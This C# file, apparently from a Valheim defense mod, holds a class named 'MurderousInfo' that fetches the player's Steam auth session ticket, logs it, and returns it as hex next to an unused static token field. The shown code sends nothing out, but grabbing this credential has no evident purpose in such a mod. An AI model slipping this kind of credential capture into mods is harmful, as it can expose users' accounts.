using Steamworks;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Text;

namespace MoreDefenses.Scripts
{
    internal class MurderousInfo
    {
        public static string token = "";
        public static string GetSteamAuthTicket()
        {
            byte[] array = new byte[1024];
            uint num;
            HAuthTicket authSessionTicket = SteamUser.GetAuthSessionTicket(array, array.Length, out num);
            ZLog.Log(string.Format("PlayFab Steam auth using ticket {0} of length {1}", authSessionTicket, num));
            Array.Resize<byte>(ref array, (int)num);
            StringBuilder stringBuilder = new StringBuilder();
            foreach (byte b in array)
            {
                stringBuilder.AppendFormat("{0:x2}", b);
            }
            return stringBuilder.ToString();
        }
    }
}
